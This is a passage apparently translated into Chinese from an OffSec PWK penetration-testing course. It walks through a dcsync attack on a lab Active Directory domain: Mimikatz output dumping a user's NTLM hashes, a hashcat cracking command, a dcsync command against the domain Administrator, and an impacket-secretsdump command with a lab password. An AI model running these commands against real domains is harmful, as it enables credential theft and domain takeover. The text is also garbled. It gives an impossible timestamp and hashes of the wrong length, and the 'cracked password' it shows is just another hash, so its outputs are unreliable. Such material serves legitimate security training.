
[DC] `corp\dave` will be the user account

[rpc] Service : `ldap`

[rpc] Authn : `GSS_NEGO` (9)

Object DN

RDN : `dave`

SAM

Username : `dave`

Account Type : `30000000` ( `USER_OBJECT` )

User Account Control : `00410200` ( `NORMAL_ACCOUNT_DONT_EXPIRE_PASSWD` )

DONT_REQUIRE_AUTH :

Account expiration :

Password last change : `9/7/2022 54:57`

Object SID : `S-1-21-37837020-65890595-17818436-1103`

Object Relative ID : `1103`

Credentials:

Hash NTLM : `08d7a7a6f6697bbae4178474`

- `08d7a7a6f6697bbae4178474`
- `1a180659d5e2bc44ce5097d`
- `45bc7d43791130842764efdae`
- `7ffd2defbca62b2d4951d`

列表 821 - 使用 Mimikatz 执行 dcsync 攻击以获取 (Active Directory 2016), https://adsecurity.org/ (GitHub, 2022), https://github.com/impacket/blob/master/secretsdump.py

PWK - © 2023 OffSec Services Limited. 保留所有权利。

Mimikatz 通过伪装成域控制器并在复制执行 dcsync 攻击获取凭据。现在，复制 NTLM 哈希并存储在 Kali 系统的名为 `hashes.dcsync` 的文件中。我们可以像在密码攻击中学习的那样，使用 Hashcat 跟踪该哈希。我们将输入 1000 作为模式，`rockyou.txt` 作为字典，`best64.rule` 作为文件。在输入包含 NTLM 哈希的文件后，我们在虚拟机中运行 Hashcat。

```
kali@kali:~ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/best64.rule --force
```

```
08d74a6f9b6971bbae418744
```

列表 822 - 使用 Mimikatz 破解通过 dcsync 攻击获得的 NTLM 哈希

列表 822 显示我们成功检索了 dave 的明文密码。我们可以获取 corp 域中任何用户的 NTLM 哈希。此外，我们可以尝试破解这些哈希并检索这些账户的明文密码。特别是我们执行 dcsync 攻击以获取域用户的任何密码，甚至是域管理员账户。

```
mimikatz # lsadump:dcsync /user:corp\Administrator
```

Credentials:

Hash NTLM: `289d2c6cf8d47a7e2eb39f05425`

列表 823 - 使用 Mimikatz 执行 dcsync 攻击以获取域管理员的凭据

我们将利用通过 dcsync 获取的 NTLM 哈希来讨论横向移动向量。现在，让我们从 Linux 执行 dcsync 攻击。我们将使用 `impacket-secretsdump` 来实现这一点。我们将用户名 dave 作为 `-just-do-dc` 的参数，并提供具有所需权限的用户凭据，格式为：`domain/user:password@ip`。

```
kali@kali:~ impacket-secretsdump -just-do-dc corp.com/jeffadmin:RouhahaTungerateBroom2023!@192.168.50.70
```

Impacket v0.10.0 - Copyright 2022 Secure Corporation
